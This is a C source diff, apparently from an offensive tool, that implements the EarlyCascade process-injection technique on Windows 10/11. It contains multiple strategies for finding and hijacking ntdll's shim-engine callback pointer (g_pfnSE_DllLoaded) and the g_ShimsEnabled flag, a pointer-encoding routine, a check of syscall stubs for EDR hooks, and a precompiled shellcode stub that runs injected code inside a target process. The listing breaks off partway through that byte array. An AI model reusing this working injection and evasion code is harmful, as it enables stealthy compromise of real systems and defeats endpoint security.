+
+#ifndef ENABLE_FREEZE
+#define ENABLE_FREEZE 0
+#endif
 
 // ============================================================================
 // Pattern Scanner
@@ -3726,295 +3894,548 @@ static DWORD GetNtdllSectionSize(ULONG_PTR baseAddress, const char* name) {
 
 // ============================================================================
 // FindSE_DllLoadedAddress
-// Scans ntdll .text for the pattern that references g_pfnSE_DllLoaded
+// Cross-version approach for all Windows 10/11 builds:
+//
+// Strategy D (primary — PoC-proven, Win10+Win11):
+//   Locate LdrpLoadShimEngine by counting ret instructions from a known
+//   exported function (RtlQueryDepthSList on Win10, RtlUnlockMemoryBlockLookaside
+//   on Win11).  Inside LdrpLoadShimEngine, scan for:
+//     mov rdi/rax, qword [rip+disp32] → g_pfnSE_DllLoaded  (48 8B 3D / 48 8B 05)
+//     cmp byte [rip+disp32], r12b/r13b → g_ShimsEnabled      (44 38 25 / 44 38 2D)
+//   This is the method used by all working PoCs (Cracked5pider, c0rnbread,
+//   0xNinjaCyclone).
+//
+// Strategy A (fallback): Load apphelp.dll and scan .mrdata for the
+//   RtlEncodePointer-encoded value of SE_DllLoaded export address.
+//
+// Strategy B (fallback 2): Scan .text for RIP-relative MOVs that decode
+//   via RtlDecodePointer into apphelp.dll .text.
+//
+// Strategy C (last resort): Generic pattern-based .text/.mrdata scan.
 // ============================================================================
 
 LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
-    ULONG_PTR base = (ULONG_PTR)hNtDLL;
-    ULONG_PTR textBase = GetNtdllSectionBase(base, ".text");
-    DWORD     textSize = GetNtdllSectionSize(base, ".text");
+    ULONG_PTR base       = (ULONG_PTR)hNtDLL;
+    ULONG_PTR textBase   = GetNtdllSectionBase(base, ".text");
+    DWORD     textSize   = GetNtdllSectionSize(base, ".text");
     ULONG_PTR mrdataBase = GetNtdllSectionBase(base, ".mrdata");
     DWORD     mrdataSize = GetNtdllSectionSize(base, ".mrdata");
 
-    if (!textBase || !textSize || !mrdataBase || !mrdataSize)
+    if (!textBase || !textSize || !mrdataBase || !mrdataSize) {
+        LOG_EC("FindSE: section lookup failed (text=%p/%lX mrdata=%p/%lX)",
+               (void*)textBase, textSize, (void*)mrdataBase, mrdataSize);
+        if (ppOffsetAddress) *ppOffsetAddress = NULL;
         return NULL;
+    }
 
-    // Pattern: mov edx,[gs:330h]; mov eax,edx; mov rdi,[rel g_pfnSE_DllLoaded]
-    BYTE pattern[] = { 0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F,
-                       0x8B, 0xC2, 0x48, 0x8B, 0x3D };
-    LPBYTE pFound = (LPBYTE)FindPattern((LPBYTE)textBase, textSize,
-                                         pattern, sizeof(pattern));
-    if (!pFound)
-        return NULL;
+    LOG_EC("FindSE: ntdll=%p text=%p+%lX mrdata=%p+%lX",
+           hNtDLL, (void*)textBase, textSize, (void*)mrdataBase, mrdataSize);
 
-    // The RIP-relative offset is 4 bytes after the last byte of the pattern
-    // Instruction: 48 8B 3D <offset32>  -> next instr at pFound+12+4
-    LPBYTE pOffsetPtr = pFound + sizeof(pattern);
-    INT32  relOffset  = *(INT32*)pOffsetPtr;
-    LPVOID pResolved  = (LPVOID)(pOffsetPtr + 4 + relOffset);
+    // ---- Strategy D: LdrpLoadShimEngine-based (primary) ----------------------
+    //
+    // Technique from Cracked5pider PoC + c0rnbread Win11 fix:
+    //   1. Find an exported function near LdrpLoadShimEngine
+    //   2. Count ret (0xC3 0xCC) patterns to reach LdrpLoadShimEngine
+    //   3. Scan for mov reg, qword [rip+disp32] with reg=rdi(0x3D) or rax(0x05)
+    //      that resolves into .mrdata → that's g_pfnSE_DllLoaded
+    //
+    // We try multiple anchor functions to be robust across Windows versions:
+    //   Win10: RtlQueryDepthSList → 2 rets → LdrpLoadShimEngine
+    //   Win11: RtlUnlockMemoryBlockLookaside → 6 rets → LdrpLoadShimEngine
+    //   Extra anchors for newer builds if the above fail
+    //
+    {
+        struct { const char* exportName; int retCount; } anchors[] = {
+            { "RtlQueryDepthSList",              2 },  // Win10
+            { "RtlUnlockMemoryBlockLookaside",   6 },  // Win11
+            { "RtlQueryDepthSList",              3 },  // future-proof variants
+            { "RtlQueryDepthSList",              4 },
+            { "RtlUnlockMemoryBlockLookaside",   5 },
+            { "RtlUnlockMemoryBlockLookaside",   7 },
+        };
 
-    // Validate: must fall within .mrdata
-    if ((ULONG_PTR)pResolved < mrdataBase ||
-        (ULONG_PTR)pResolved >= mrdataBase + mrdataSize)
-        return NULL;
+        for (int a = 0; a < (int)(sizeof(anchors)/sizeof(anchors[0])); a++) {
+            PBYTE ptr = (PBYTE)GetProcAddress((HMODULE)hNtDLL, anchors[a].exportName);
+            if (!ptr) continue;
 
-    if (ppOffsetAddress)
-        *ppOffsetAddress = pOffsetPtr;
+            // Verify the anchor is inside .text section
+            if ((ULONG_PTR)ptr < textBase || (ULONG_PTR)ptr >= textBase + textSize)
+                continue;
 
-    return pResolved;
+            // Count ret instructions (0xC3 followed by 0xCC = function boundary)
+            int retsSeen = 0;
+            PBYTE pScan = ptr;
+            PBYTE pTextEnd = (PBYTE)(textBase + textSize);
+            while (pScan < pTextEnd - 1 && retsSeen < anchors[a].retCount) {
+                if (*(PWORD)pScan == 0xCCC3) {
+                    retsSeen++;
+                }
+                pScan++;
+            }
+            if (retsSeen < anchors[a].retCount) continue;
+
+            // Now scan forward (inside LdrpLoadShimEngine) for mov reg, [rip+disp32]
+            // Patterns: 48 8B 3D (mov rdi), 48 8B 05 (mov rax), 4C 8B 2D (mov r13)
+            PBYTE pFuncEnd = pScan + 0x1000;  // scan up to 4KB into the function
+            if (pFuncEnd > pTextEnd) pFuncEnd = pTextEnd;
+
+            LPVOID pFoundSlot = NULL;
+            LPBYTE pFoundOff  = NULL;
+
+            PBYTE p = pScan;
+            while (p + 7 <= pFuncEnd) {
+                // Check for REX.W MOV reg, [rip+disp32]: 48 8B xx or 4C 8B xx
+                if ((p[0] == 0x48 || p[0] == 0x4C) && p[1] == 0x8B &&
+                    ((p[2] & 0xC7) == 0x05 || (p[2] & 0xC7) == 0x3D || (p[2] & 0xC7) == 0x2D)) {
+                    LPBYTE pOff = p + 3;
+                    if (pOff + 4 <= pFuncEnd) {
+                        INT32 rel = *(INT32*)pOff;
+                        ULONG_PTR resolved = (ULONG_PTR)(pOff + 4 + rel);
+                        // Must resolve into .mrdata, 8-byte aligned
+                        if (resolved >= mrdataBase && resolved < mrdataBase + mrdataSize &&
+                            (resolved & 7) == 0) {
+                            pFoundSlot = (LPVOID)resolved;
+                            pFoundOff  = pOff;
+                            LOG_EC("FindSE: Strategy D hit [%s+%d rets] @ %p -> slot=%p (val=%p)",
+                                   anchors[a].exportName, anchors[a].retCount,
+                                   p, pFoundSlot, (void*)*(ULONG_PTR*)resolved);
+                            break;
+                        }
+                    }
+                }
+                p++;
+            }
+
+            if (pFoundSlot) {
+                if (ppOffsetAddress) *ppOffsetAddress = pFoundOff;
+                return pFoundSlot;
+            }
+        }
+
+        LOG_EC("FindSE: Strategy D found no match via LdrpLoadShimEngine anchors");
+    }
+    typedef PVOID (NTAPI *pfn_RtlDecodePointer)(PVOID);
+    pfn_RtlDecodePointer pRtlDecode =
+        (pfn_RtlDecodePointer)GetProcAddress((HMODULE)hNtDLL, "RtlDecodePointer");
+
+    HMODULE hApphelp = GetModuleHandleA("apphelp.dll");
+    BOOL bNeedsFreeApphelp = FALSE;
+    if (!hApphelp) {
+        hApphelp = LoadLibraryA("apphelp.dll");
+        bNeedsFreeApphelp = (hApphelp != NULL);
+    }
+
+    if (hApphelp && pRtlDecode) {
+        // Get apphelp.dll text section bounds for validation
+        ULONG_PTR ahBase     = (ULONG_PTR)hApphelp;
+        ULONG_PTR ahTextBase = GetNtdllSectionBase(ahBase, ".text");
+        DWORD     ahTextSize = GetNtdllSectionSize(ahBase, ".text");
+
+        LOG_EC("FindSE: apphelp=%p textBase=%p+%lX", (void*)ahBase, (void*)ahTextBase, ahTextSize);
+
+        if (ahTextBase && ahTextSize) {
+            // Strategy A: scan .mrdata for encoded pointer into apphelp .text
+            ULONG_PTR* pSlot    = (ULONG_PTR*)mrdataBase;
+            ULONG_PTR* pSlotEnd = (ULONG_PTR*)(mrdataBase + mrdataSize);
+            while (pSlot < pSlotEnd) {
+                if (((ULONG_PTR)pSlot & 7) == 0 && *pSlot != 0) {
+                    ULONG_PTR decoded = (ULONG_PTR)pRtlDecode((PVOID)*pSlot);
+                    if (decoded >= ahTextBase && decoded < ahTextBase + ahTextSize) {
+                        LOG_EC("FindSE: Strategy A hit: slot=%p encoded=%p decoded=%p (apphelp.text)",
+                               (void*)pSlot, (void*)*pSlot, (void*)decoded);
+
+                        // Find the .text instruction that references this slot
+                        // Scan .text for REX.W MOV reg,[rip+disp32] resolving to pSlot
+                        LPBYTE pCur    = (LPBYTE)textBase;
+                        LPBYTE pTxtEnd = pCur + textSize;
+                        LPBYTE pBestMatch = NULL;
+                        while (pCur + 7 <= pTxtEnd) {
+                            if ((pCur[0] == 0x48 || pCur[0] == 0x4C) && pCur[1] == 0x8B) {
+                                if ((pCur[2] & 0xC7) == 0x05) {
+                                    LPBYTE pOff = pCur + 3;
+                                    if (pOff + 4 <= pTxtEnd) {
+                                        INT32  rel = *(INT32*)pOff;
+                                        ULONG_PTR resolved = (ULONG_PTR)(pOff + 4 + rel);
+                                        if (resolved == (ULONG_PTR)pSlot) {
+                                            pBestMatch = pOff;
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                            pCur++;
+                        }
+
+                        // When the referencing instruction was not found, pass mrdataBase as
+                        // offset so FindShimsEnabledAddress falls into its full-.text scan path.
+                        if (ppOffsetAddress) *ppOffsetAddress = pBestMatch ? pBestMatch : (LPVOID)(mrdataBase);
+                        if (bNeedsFreeApphelp) FreeLibrary(hApphelp);
+                        return (LPVOID)pSlot;
+                    }
+                }
+                pSlot++;
+            }
+            LOG_EC("FindSE: Strategy A found no apphelp-encoded pointer in .mrdata");
+
+            // Strategy B: scan .text for any RIP-relative MOV that decodes to apphelp .text
+            LPBYTE pCur    = (LPBYTE)textBase;
+            LPBYTE pTxtEnd = pCur + textSize;
+            while (pCur + 7 <= pTxtEnd) {
+                if ((pCur[0] == 0x48 || pCur[0] == 0x4C) && pCur[1] == 0x8B) {
+                    if ((pCur[2] & 0xC7) == 0x05) {
+                        LPBYTE pOff = pCur + 3;
+                        if (pOff + 4 <= pTxtEnd) {
+                            INT32      rel      = *(INT32*)pOff;
+                            ULONG_PTR  resolved = (ULONG_PTR)(pOff + 4 + rel);
+                            if (resolved >= mrdataBase && resolved < mrdataBase + mrdataSize) {
+                                if ((resolved & 7) == 0) {
+                                    ULONG_PTR slotVal = *(ULONG_PTR*)resolved;
+                                    if (slotVal != 0) {
+                                        ULONG_PTR decoded = (ULONG_PTR)pRtlDecode((PVOID)slotVal);
+                                        if (decoded >= ahTextBase && decoded < ahTextBase + ahTextSize) {
+                                            LOG_EC("FindSE: Strategy B hit: instr=%p slot=%p decoded=%p",
+                                                   pCur, (void*)resolved, (void*)decoded);
+                                            if (ppOffsetAddress) *ppOffsetAddress = pOff;
+                                            if (bNeedsFreeApphelp) FreeLibrary(hApphelp);
+                                            return (LPVOID)resolved;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                pCur++;
+            }
+            LOG_EC("FindSE: Strategy B found no apphelp-decoded slot in .mrdata");
+        }
+    }
+
+    if (bNeedsFreeApphelp && hApphelp) FreeLibrary(hApphelp);
+
+    // ---- Strategy C: original Tier-1 patterns WITHOUT NULL-slot requirement ---
+    LOG_EC("FindSE: falling back to Strategy C (pattern scan, no NULL requirement)");
+
+    static BYTE pat1[] = { 0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F,
+                           0x8B, 0xC2, 0x48, 0x8B, 0x3D };
+    // Generic 3-byte patterns: only accept resolves INTO .mrdata, 8-byte aligned
+    static BYTE pat2[] = { 0x48, 0x8B, 0x05 };
+    static BYTE pat3[] = { 0x48, 0x8B, 0x3D };
+    static BYTE pat4[] = { 0x4C, 0x8B, 0x2D };
+    static BYTE pat5[] = { 0x48, 0x8B, 0x0D };
+
+    struct { LPBYTE pat; DWORD len; } patterns[] = {
+        { pat1, sizeof(pat1) },
+        { pat2, sizeof(pat2) },
+        { pat3, sizeof(pat3) },
+        { pat4, sizeof(pat4) },
+        { pat5, sizeof(pat5) },
+    };
+
+    LPBYTE pTxtEnd = (LPBYTE)(textBase + textSize);
+
+    // For pat1 (unique 12-byte pattern), single match is reliable
+    {
+        LPBYTE pCur = (LPBYTE)textBase;
+        LPBYTE pFound = (LPBYTE)FindPattern(pCur, textSize, pat1, sizeof(pat1));
+        if (pFound) {
+            LPBYTE pOff = pFound + sizeof(pat1);
+            if (pOff + 4 <= pTxtEnd) {
+                INT32  rel      = *(INT32*)pOff;
+                LPVOID pResolved = (LPVOID)(pOff + 4 + rel);
+                if ((ULONG_PTR)pResolved >= mrdataBase &&
+                    (ULONG_PTR)pResolved <  mrdataBase + mrdataSize) {
+                    LOG_EC("FindSE: Strategy C Tier-1/pat1 hit @ %p -> slot=%p", pFound, pResolved);
+                    if (ppOffsetAddress) *ppOffsetAddress = pOff;
+                    return pResolved;
+                }
+            }
+        }
+    }
+
+    // For generic 3-byte patterns: scan ALL matches and pick the .mrdata-aligned one
+    for (int p = 1; p < 5; p++) {
+        LPBYTE pCur = (LPBYTE)textBase;
+        while (pCur < pTxtEnd) {
+            LPBYTE pFound = (LPBYTE)FindPattern(pCur, (DWORD)(pTxtEnd - pCur),
+                                                 patterns[p].pat, patterns[p].len);
+            if (!pFound) break;
+            LPBYTE pOff = pFound + patterns[p].len;
+            if (pOff + 4 <= pTxtEnd) {
+                INT32  rel      = *(INT32*)pOff;
+                LPVOID pResolved = (LPVOID)(pOff + 4 + rel);
+                if ((ULONG_PTR)pResolved >= mrdataBase &&
+                    (ULONG_PTR)pResolved <  mrdataBase + mrdataSize &&
+                    ((ULONG_PTR)pResolved & 7) == 0) {
+                    LOG_EC("FindSE: Strategy C Tier-1/pat%d hit @ %p -> slot=%p (val=%p)",
+                           p+1, pFound, pResolved, (void*)*(ULONG_PTR*)pResolved);
+                    if (ppOffsetAddress) *ppOffsetAddress = pOff;
+                    return pResolved;
+                }
+            }
+            pCur = pFound + 1;
+        }
+    }
+
+    LOG_EC("FindSE: ALL strategies exhausted -- g_pfnSE_DllLoaded not found");
+    if (ppOffsetAddress) *ppOffsetAddress = NULL;
+    return NULL;
 }
 
 // ============================================================================
 // FindShimsEnabledAddress
-// Scans near the SE_DllLoaded offset for g_ShimsEnabled
+// Searches ±0xFF bytes around pDllLoadedOffsetAddress for g_ShimsEnabled.
+// Two patterns are tried (both checked against .data section):
+//   Pattern 1: C6 05  (mov byte ptr [g_ShimsEnabled], 1)  pcOff=4
+//   Pattern 2: 44 38 25 (cmp byte ptr [g_ShimsEnabled], r12b) pcOff=4
 // ============================================================================
 
 LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     if (!pDllLoadedOffsetAddress)
         return NULL;
 
-    ULONG_PTR base       = (ULONG_PTR)hNtDLL;
-    ULONG_PTR mrdataBase = GetNtdllSectionBase(base, ".mrdata");
-    DWORD     mrdataSize = GetNtdllSectionSize(base, ".mrdata");
-    if (!mrdataBase || !mrdataSize)
+    ULONG_PTR base    = (ULONG_PTR)hNtDLL;
+    ULONG_PTR dataBase = GetNtdllSectionBase(base, ".data");   // <-- .data NOT .mrdata
+    DWORD     dataSize = GetNtdllSectionSize(base, ".data");
+    if (!dataBase || !dataSize) {
+        LOG_EC("FindShimsEnabledAddress: failed to locate .data section");
         return NULL;
+    }
 
-    // Scan 256 bytes around the offset pointer for C6 05 pattern (mov byte ptr [rel], imm8)
-    LPBYTE scanStart = (LPBYTE)pDllLoadedOffsetAddress - 128;
-    BYTE   pattern[] = { 0xC6, 0x05 };
-    LPBYTE pFound    = (LPBYTE)FindPattern(scanStart, 256, pattern, sizeof(pattern));
-    if (!pFound)
+    // Clamp scan window to .text section bounds to prevent underflow
+    ULONG_PTR textBase = GetNtdllSectionBase(base, ".text");
+    DWORD     textSize = GetNtdllSectionSize(base, ".text");
+    if (!textBase || !textSize) {
+        LOG_EC("FindShimsEnabledAddress: failed to locate .text section");
         return NULL;
+    }
+    LPBYTE textStart = (LPBYTE)textBase;
+    LPBYTE textEnd   = textStart + textSize;
 
-    // Layout: C6 05 <offset32:2+2> <byte:+6> <byte:+7>
-    // Check: byte at offset+6 == 0x00 (false branch), byte at offset+7 area == 0x01 (or similar)
-    // Validate via checking nearby byte pattern used to write 0/1
-    if (*(pFound + 6) != 0x00)
-        return NULL;
+    // Determine if pDllLoadedOffsetAddress is inside .text or not (Strategy A mrdata fallback)
+    BOOL bOffsetInText = ((ULONG_PTR)pDllLoadedOffsetAddress >= textBase &&
+                          (ULONG_PTR)pDllLoadedOffsetAddress < textBase + textSize);
 
-    // Resolve the RIP-relative address of g_ShimsEnabled
-    // Offset bytes start at pFound+2
-    INT32  relOffset = *(INT32*)(pFound + 2);
-    LPVOID pResolved = (LPVOID)(pFound + 2 + 4 + relOffset);
+    // Pattern 1: C6 05 ?? ?? ?? ?? 01   mov byte ptr [g_ShimsEnabled], 1  pcOff=5
+    // Pattern 2: 44 38 25 ?? ?? ?? ??   cmp byte ptr [g_ShimsEnabled], r12b  pcOff=4  (Win10)
+    // Pattern 3: 44 38 2D ?? ?? ?? ??   cmp byte ptr [g_ShimsEnabled], r13b  pcOff=4  (Win11)
+    static BYTE pat1[] = { 0xC6, 0x05 };
+    static BYTE pat2[] = { 0x44, 0x38, 0x25 };
+    static BYTE pat3[] = { 0x44, 0x38, 0x2D };
 
-    // Validate: must fall within .mrdata
-    if ((ULONG_PTR)pResolved < mrdataBase ||
-        (ULONG_PTR)pResolved >= mrdataBase + mrdataSize)
-        return NULL;
+    struct { LPBYTE pat; DWORD len; DWORD pcOff; } patterns[] = {
+        { pat1, 2, 5 },   // pcOff = 5: C6 05 disp32 01 — RIP = pFound+7; pOffset = pFound+2; resolved = disp32 + pOffset + 5
+        { pat2, 3, 4 },   // pcOff = 4: 44 38 25 disp32 — RIP = pFound+7; pOffset = pFound+3; resolved = disp32 + pOffset + 4  (Win10)
+        { pat3, 3, 4 },   // pcOff = 4: 44 38 2D disp32 — RIP = pFound+7; pOffset = pFound+3; resolved = disp32 + pOffset + 4  (Win11)
+    };
 
-    return pResolved;
-}
+    for (int p = 0; p < 3; p++) {
+        LPBYTE scanStart, scanEnd;
+        if (bOffsetInText) {
+            // Search ±0xFF bytes around the offset address, clamped to .text bounds
+            LPBYTE rawStart = (LPBYTE)pDllLoadedOffsetAddress - 0xFF;
+            LPBYTE rawEnd   = (LPBYTE)pDllLoadedOffsetAddress + 0xFF;
+            scanStart = rawStart < textStart ? textStart : rawStart;
+            scanEnd   = rawEnd   > textEnd   ? textEnd   : rawEnd;
+        } else {
+            // Strategy A fallback: offset is in .mrdata, scan full .text
+            scanStart = textStart;
+            scanEnd   = textEnd;
+        }
 
-// ============================================================================
-// FindAvrfpAddress - MalwareTech AppVerifier fallback
-// ============================================================================
+        if (scanStart >= scanEnd)
+            continue;
 
-ULONG_PTR FindAvrfpAddress(ULONG_PTR mrdataBase) {
-    if (!mrdataBase)
-        return 0;
+        LPBYTE pCur = scanStart;
+        while (pCur < scanEnd) {
+            LPBYTE pFound = (LPBYTE)FindPattern(pCur, (DWORD)(scanEnd - pCur),
+                                                 patterns[p].pat, patterns[p].len);
+            if (!pFound)
+                break;
 
-    // Search from base+0x280 for a pointer whose value equals mrdataBase
-    // (that's LdrpMrdataBase)
-    ULONG_PTR scanAddr = mrdataBase + 0x280;
-    ULONG_PTR scanEnd  = mrdataBase + 0x2000;
+            // Jump past the pattern bytes to the 4-byte RIP offset
+            LPBYTE pOffset = pFound + patterns[p].len;
 
-    ULONG_PTR* pLdrpMrdataBase = NULL;
-    for (ULONG_PTR addr = scanAddr; addr < scanEnd; addr += sizeof(ULONG_PTR)) {
-        if (*(ULONG_PTR*)addr == mrdataBase) {
-            pLdrpMrdataBase = (ULONG_PTR*)addr;
-            break;
+            // Validate: high byte of offset == 0x00 (nearby address)
+            if (*(pOffset + 3) == 0x00) {
+                INT32  rel      = *(INT32*)pOffset;
+                LPVOID pResolved = (LPVOID)(pOffset + patterns[p].pcOff + rel);
+
+                // Must be in .data
+                if ((ULONG_PTR)pResolved >= dataBase &&
+                    (ULONG_PTR)pResolved <  dataBase + dataSize) {
+                    LOG_EC("FindShimsEnabledAddress: pattern %d matched @ %p -> %p", p, pFound, pResolved);
+                    return pResolved;
+                }
+            }
+
+            pCur = pFound + 1;  // advance and retry
         }
     }
-    if (!pLdrpMrdataBase)
-        return 0;
 
-    // AvrfpAPILookupCallbackRoutine is 2 pointers (0x10 bytes) after LdrpMrdataBase on x64
-    // This is a known fixed layout from MalwareTech EDR-Preloader research
-    ULONG_PTR* pAvrfp = pLdrpMrdataBase + 2;
-
-    // Validate: must still be within .mrdata section bounds
-    if ((ULONG_PTR)pAvrfp < mrdataBase || (ULONG_PTR)pAvrfp >= mrdataBase + 0x4000)
-        return 0;
-
-    return (ULONG_PTR)pAvrfp;
+    LOG_EC("FindShimsEnabledAddress: all patterns failed");
+    return NULL;
 }
 
 // ============================================================================
-// EncodeSystemPtr - Encode using SharedUserData!Cookie
+// EncodeSystemPtr - Encode using RtlEncodePointer (version-safe)
+// RtlEncodePointer uses SharedUserData cookie on all Windows versions,
+// matching the encoding used by g_pfnSE_DllLoaded slot.
 // ============================================================================
+
+typedef PVOID (NTAPI *pfn_RtlEncodePointer)(PVOID);
 
 LPVOID EncodeSystemPtr(LPVOID ptr) {
-    ULONG64 cookie64 = (ULONG64)(*(ULONG*)0x7FFE0330);  // zero-extend to 64-bit
-    ULONG64 val      = (ULONG64)ptr;
-    ULONG   rotBits  = (ULONG)(cookie64 & 0x3F);
-    ULONG64 encoded  = _rotr64(val ^ cookie64, rotBits);
-    return (LPVOID)encoded;
+    // Use RtlEncodePointer — uses SharedUserData cookie on all versions
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll) {
+        pfn_RtlEncodePointer pEncode =
+            (pfn_RtlEncodePointer)GetProcAddress(hNtdll, "RtlEncodePointer");
+        if (pEncode)
+            return pEncode(ptr);
+    }
+    // Fallback: read SharedUserData!Cookie dynamically
+    // 0x7FFE0000 = KUSER_SHARED_DATA base (stable across all Windows x64)
+    // Cookie offset: 0x330 (Win10/11 up to 23H2), may move in 24H2+
+    // We try the standard offset and, if the read value looks bogus, use EncodePointer()
+    __try {
+        ULONG cookie = *(volatile ULONG*)(0x7FFE0000 + 0x330);
+        if (cookie != 0 && cookie != 0xFFFFFFFF)
+            return (LPVOID)_rotr64((ULONG64)cookie ^ (ULONG64)ptr, cookie & 0x3F);
+    } __except (EXCEPTION_EXECUTE_HANDLER) { }
+    // Final fallback: Win32 EncodePointer (uses the process cookie, not system cookie)
+    return EncodePointer(ptr);
 }
 
 // ============================================================================
-// VerifyNoHooks - Check syscall stubs for EDR hooks
+// VerifyNoHooks
+// Walks all Nt* exports in ntdll.dll and checks the first 4 bytes against
+// the standard syscall stub preamble (4C 8B D1 B8).
+// Returns TRUE if no patches detected, FALSE if any hook is found.
 // ============================================================================
 
 BOOL VerifyNoHooks(VOID) {
-    // Expected syscall stub prefix: mov r10,rcx; mov eax,??
-    static const BYTE expected[4] = { 0x4C, 0x8B, 0xD1, 0xB8 };
-
-    HMODULE hNtdll = (HMODULE)GetNtdllFromPEB();  // PEB walk — no Win32 API calls
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll)
         return FALSE;
 
-    const char* funcs[] = {
-        "NtAllocateVirtualMemory",
-        "NtProtectVirtualMemory",
-        "NtMapViewOfSection",
-        NULL
-    };
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+    DWORD dwExpRVA = pNt->OptionalHeader
+                         .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (!dwExpRVA)
+        return FALSE;
 
-    BOOL allClean = TRUE;
-    for (int i = 0; funcs[i]; i++) {
-        LPBYTE pFunc = (LPBYTE)GetProcAddress(hNtdll, funcs[i]);
-        if (!pFunc)
+    PIMAGE_EXPORT_DIRECTORY pExp =
+        (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + dwExpRVA);
+
+    PDWORD  pNames    = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
+    PDWORD  pFuncs    = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
+    PWORD   pOrdinals = (PWORD) ((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);
+
+    DWORD dwHooked  = 0;
+    DWORD dwChecked = 0;
+
+    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
+        const char* szName = (const char*)((PBYTE)hNtdll + pNames[i]);
+        if (szName[0] != 'N' || szName[1] != 't')
             continue;
-        if (memcmp(pFunc, expected, 4) != 0) {
-            allClean = FALSE;
+
+        dwChecked++;
+        PBYTE pFunc = (PBYTE)hNtdll + pFuncs[pOrdinals[i]];
+
+        // Standard stub preamble: 4C 8B D1 B8 <SSN>
+        if (pFunc[0] != 0x4C || pFunc[1] != 0x8B ||
+            pFunc[2] != 0xD1 || pFunc[3] != 0xB8) {
 #if DEBUG_BUILD
-            printf("[!] Hook detected in %s\n", funcs[i]);
+            LOG_INFO("VerifyNoHooks: hook on %s (byte[0]=0x%02X)", szName, pFunc[0]);
 #endif
-        } else {
-#if DEBUG_BUILD
-            printf("[+] %s is clean\n", funcs[i]);
-#endif
+            dwHooked++;
         }
     }
-    return allClean;
+
+#if DEBUG_BUILD
+    if (dwHooked == 0)
+        LOG_INFO("VerifyNoHooks: all %lu Nt* stubs clean", dwChecked);
+    else
+        LOG_INFO("VerifyNoHooks: %lu hook(s) detected", dwHooked);
+#endif
+
+    return (dwHooked == 0);
 }
+
+// ============================================================================
+// Pre-compiled x64 EarlyCascade stub
+// Source: 0xNinjaCyclone/EarlyCascade (main.c)
+// This stub runs inside the target process when g_pfnSE_DllLoaded fires:
+//   1. Resolves LoadLibraryA via PEB walk
+//   2. Resets g_ShimsEnabled to FALSE (address patched at placeholder 0x11*8)
+//   3. Resolves the shellcode address (placed right after the stub)
+//   4. Calls the shellcode via NtQueueApcThread-like mechanism
+// ============================================================================
+static BYTE g_CascadeStub[] = {
+    0x56, 0x57, 0x65, 0x48, 0x8b, 0x14, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x52, 0x18, 0x48,
+    0x8d, 0x52, 0x20, 0x52, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x12, 0x48, 0x3b, 0x14, 0x24, 0x0f, 0x84,
+    0x85, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x83, 0xc1,
+    0x0a, 0x48, 0x83, 0xe1, 0xf0, 0x48, 0x29, 0xcc, 0x49, 0x89, 0xc9, 0x48, 0x31, 0xc9, 0x48, 0x31,
+    0xc0, 0x66, 0xad, 0x38, 0xe0, 0x74, 0x12, 0x3c, 0x61, 0x7d, 0x06, 0x3c, 0x41, 0x7c, 0x02, 0x04,
+    0x20, 0x88, 0x04, 0x0c, 0x48, 0xff, 0xc1, 0xeb, 0xe5, 0xc6, 0x04, 0x0c, 0x00, 0x48, 0x89, 0xe6,
+    0xe8, 0xfe, 0x00, 0x00, 0x00, 0x4c, 0x01, 0xcc, 0x48, 0xbe, 0xed, 0xb5, 0xd3, 0x22, 0xb5, 0xd2,
+    0x77, 0x03, 0x48, 0x39, 0xfe, 0x74, 0xa0, 0x48, 0xbe, 0x75, 0xee, 0x40, 0x70, 0x36, 0xe9, 0x37,
+    0xd5, 0x48, 0x39, 0xfe, 0x74, 0x91, 0x48, 0xbe, 0x2b, 0x95, 0x21, 0xa7, 0x74, 0x12, 0xd7, 0x02,
+    0x48, 0x39, 0xfe, 0x74, 0x82, 0xe8, 0x05, 0x00, 0x00, 0x00, 0xe9, 0xbc, 0x00, 0x00, 0x00, 0x58,
+    0x48, 0x89, 0x42, 0x30, 0xe9, 0x6e, 0xff, 0xff, 0xff, 0x5a, 0x48, 0xb8, 0x11, 0x11, 0x11, 0x11,  // 0x11*8 placeholder at offset 172
+    0x11, 0x11, 0x11, 0x11, 0xc6, 0x00, 0x00, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x52,
+    0x20, 0x48, 0x31, 0xc0, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02,
+    0x0f, 0x85, 0x83, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xd0, 0x50,
+    0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x58, 0x20, 0x49, 0x01, 0xd3, 0x48, 0x31, 0xc9, 0x8b, 0x48, 0x18,
+    0x51, 0x48, 0x85, 0xc9, 0x74, 0x69, 0x48, 0x31, 0xf6, 0x41, 0x8b, 0x33, 0x48, 0x01, 0xd6, 0xe8,
+    0x5f, 0x00, 0x00, 0x00, 0x49, 0x83, 0xc3, 0x04, 0x48, 0xff, 0xc9, 0x48, 0xbe, 0x38, 0x22, 0x61,
